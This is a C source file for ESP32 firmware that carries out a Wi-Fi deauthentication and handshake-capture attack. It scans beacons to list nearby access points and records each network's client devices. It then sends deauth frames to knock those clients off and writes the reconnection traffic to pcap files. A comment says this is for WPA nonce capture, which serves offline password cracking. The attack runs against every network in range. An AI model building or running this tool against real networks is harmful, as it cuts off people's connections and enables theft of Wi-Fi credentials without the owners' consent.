#include "deauth.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_spiffs.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "pcap.h"
#include <http_server.h>
#include <stdio.h>
#include <string.h>

static const char *TAG = "SNIFFER";

typedef struct {
  char ssid[33];    // Null-terminated SSID
  uint8_t bssid[6]; // AP MAC address
  uint8_t channel;  // Wi-Fi channel
} ap_info_t;

#define MAX_APS 50
static ap_info_t ap_list[MAX_APS];
static int ap_count = 0;
static uint8_t selected_ap_bssid[6];

bool is_bssid_seen(const uint8_t *bssid) {
  ESP_LOGD(TAG, "Checking if BSSID is seen: %02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  for (int i = 0; i < ap_count; i++) {
    if (memcmp(ap_list[i].bssid, bssid, 6) == 0) {
      ESP_LOGD(TAG, "BSSID already seen: %02X:%02X:%02X:%02X:%02X:%02X",
               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      return true;
    }
  }
  ESP_LOGD(TAG, "BSSID not seen: %02X:%02X:%02X:%02X:%02X:%02X", bssid[0],
           bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return false;
}

void add_ap(const char *ssid, const uint8_t *bssid, uint8_t channel) {
  if (ap_count >= MAX_APS) {
    ESP_LOGW(TAG,
             "AP list full, cannot add SSID: %s BSSID: "
             "%02X:%02X:%02X:%02X:%02X:%02X",
             ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return;
  }
  strncpy(ap_list[ap_count].ssid, ssid, sizeof(ap_list[ap_count].ssid) - 1);
  memcpy(ap_list[ap_count].bssid, bssid, 6);
  ap_list[ap_count].channel = channel;
  ap_count++;
}

#define MAX_STATIONS 50
static uint8_t station_list[MAX_STATIONS][6];
static int station_count = 0;

bool is_station_seen(const uint8_t *mac) {
  for (int i = 0; i < station_count; i++) {
    if (memcmp(station_list[i], mac, 6) == 0)
      return true;
  }
  return false;
}

void add_station(const uint8_t *mac) {
  if (station_count < MAX_STATIONS && !is_station_seen(mac)) {
    memcpy(station_list[station_count], mac, 6);
    station_count++;
  }
}

static void wifi_sniffer_packet_handler(void *buff,
                                        wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buff;
  const uint8_t *data = pkt->payload;

  if (is_writer_enabled()) {
    write_pcap_packet(data, pkt->rx_ctrl.sig_len);
  }
  if (type == WIFI_PKT_MGMT) {
    const uint8_t *bssid = &data[10];
    int offset = 36; // Start after 802.11 management header
    char ssid[33] = {0};
    int channel = -1;

    while (offset + 2 <= pkt->rx_ctrl.sig_len) {
      uint8_t tag_number = data[offset];
      uint8_t tag_length = data[offset + 1];

      if (offset + 2 + tag_length > pkt->rx_ctrl.sig_len)
        break; // Prevent buffer overrun

      if (tag_number == 0) { // SSID parameter set
        if (tag_length > 0 && tag_length <= 32) {
          memcpy(ssid, &data[offset + 2], tag_length);
          ssid[tag_length] = '\0';
        }
      } else if (tag_number == 3 &&
                 tag_length == 1) { // DS Parameter Set (channel)
        channel = data[offset + 2];
      }

      offset += 2 + tag_length;

      if (ssid[0] != '\0' && channel > 0)
        break; // Found both SSID and channel
    }
    ESP_LOGD(TAG, "SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d",
             ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             channel);
    // Only log and add if both SSID and channel are valid
    if (ssid[0] != '\0' && channel > 0) {
      if (!is_bssid_seen(bssid)) {
        add_ap(ssid, bssid, channel);
        ESP_LOGI(
            "BEACON",
            "[%d] SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
            ap_count, ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4],
            bssid[5], channel);
      }
    }
  } else if (type == WIFI_PKT_DATA) {
    const uint8_t *addr2 = &data[10]; // Source
    const uint8_t *addr3 = &data[16]; // BSSID
    if (memcmp(addr3, selected_ap_bssid, 6) == 0) {
      if (memcmp(addr2, selected_ap_bssid, 6) == 0) {
        ESP_LOGD(TAG, "Packet from AP itself, ignoring.");
        return; // Ignore packets from the AP itself
      }
      if (!is_station_seen(addr2)) {
        add_station(addr2);
        ESP_LOGI("CLIENT", "Station found: %02X:%02X:%02X:%02X:%02X:%02X",
                 addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5]);
      }
    }
  }
}

void deauth_clients() {
  if (station_count == 0) {
    ESP_LOGW(TAG, "No clients found on this AP.");
    close_pcap_writer();
    return;
  }

  ESP_LOGI(TAG, "Deauthing %d stations...", station_count);

  for (int i = 0; i < station_count; i++) {
    ESP_LOGI(TAG, "Deauthing client: %02X:%02X:%02X:%02X:%02X:%02X",
             station_list[i][0], station_list[i][1], station_list[i][2],
             station_list[i][3], station_list[i][4], station_list[i][5]);

    send_deauth_packet(selected_ap_bssid, station_list[i]); // Unicast deauth
    vTaskDelay(pdMS_TO_TICKS(1000)); // Delay to avoid flooding
  }
  vTaskDelay(
      pdMS_TO_TICKS(15000)); // Wait for some more packets for nonce correction
  ESP_LOGI(TAG, "Deauth completed for %d clients.", station_count);
  close_pcap_writer();
  // xTaskNotifyGive(close_task_handle); // Close PCAP writer after deauth
}

void selectAP(void) {
  if (ap_count == 0) {
    ESP_LOGI(TAG, "No BSSIDs seen yet.");
    return;
  }

  ESP_LOGI(TAG, "Seen BSSIDs:");
  for (int i = 0; i < ap_count; i++) {
    ESP_LOGI(TAG, "%02X:%02X:%02X:%02X:%02X:%02X", ap_list[i].bssid[0],
             ap_list[i].bssid[1], ap_list[i].bssid[2], ap_list[i].bssid[3],
             ap_list[i].bssid[4], ap_list[i].bssid[5]);
  }
  for (int i = 0; i < ap_count; i++) {
    // reset station list
    memset(station_list, 0, sizeof(station_list));
    station_count = 0; // Also reset the count
    memcpy(selected_ap_bssid, ap_list[i].bssid, 6);
    ESP_LOGI(TAG, "Selected BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selected_ap_bssid[0], selected_ap_bssid[1], selected_ap_bssid[2],
             selected_ap_bssid[3], selected_ap_bssid[4], selected_ap_bssid[5]);
    ESP_LOGI(TAG, "Selected SSID: %s", ap_list[i].ssid);
    ESP_LOGI(TAG, "Selected channel: %d", ap_list[i].channel);
    ESP_LOGI(TAG, "Sniffing for clients for 10 seconds...");
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    vTaskDelay(pdMS_TO_TICKS(5000)); // Wait for Wi-Fi to start
    ESP_ERROR_CHECK(
        esp_wifi_set_channel(ap_list[i].channel, WIFI_SECOND_CHAN_NONE));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    vTaskDelay(pdMS_TO_TICKS(10000)); // Capture stations for 10s

    start_pcap_writer(ap_list[i].ssid); // Start PCAP writer
    deauth_clients();
    ESP_LOGI(TAG, "Deauth sent to selected AP: %02X:%02X:%02X:%02X:%02X:%02X",
             selected_ap_bssid[0], selected_ap_bssid[1], selected_ap_bssid[2],
             selected_ap_bssid[3], selected_ap_bssid[4], selected_ap_bssid[5]);
  }
  // start_file_server_ap();
  //  xTaskCreate(close_task, "close_task", 8092, NULL, 5, &close_task_handle);
}

void channel_hopper_task(void *pvParameters) {
  int ch = 1;
  for (int i = 0; i < 50; i++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch = (ch % 13) + 1;
    vTaskDelay(pdMS_TO_TICKS(300));
  }
  selectAP();
  vTaskDelete(NULL);
}
void init_spiffs() {
  esp_vfs_spiffs_conf_t conf = {.base_path = "/spiffs",
                                .partition_label = NULL,
                                .max_files = 5,
                                .format_if_mount_failed = true};

  ESP_ERROR_CHECK(esp_vfs_spiffs_register(&conf));
  ESP_ERROR_CHECK(esp_spiffs_format(NULL));
  size_t total = 0, used = 0;
  esp_spiffs_info(NULL, &total, &used);
  ESP_LOGI("SPIFFS", "Partition size: total: %d, used: %d", total, used);
}

void app_main(void) {
  ESP_ERROR_CHECK(nvs_flash_init());
  ESP_ERROR_CHECK(esp_netif_init());
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  init_spiffs();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  esp_netif_create_default_wifi_sta();
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
  wifi_promiscuous_filter_t filter = {.filter_mask =
                                          WIFI_PROMIS_FILTER_MASK_DATA |
                                          WIFI_PROMIS_FILTER_MASK_MGMT};
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler));
  xTaskCreate(channel_hopper_task, "channel_hopper_task", 8192, NULL, 1, NULL);
  ESP_LOGI(TAG, "Sniffer started");
}
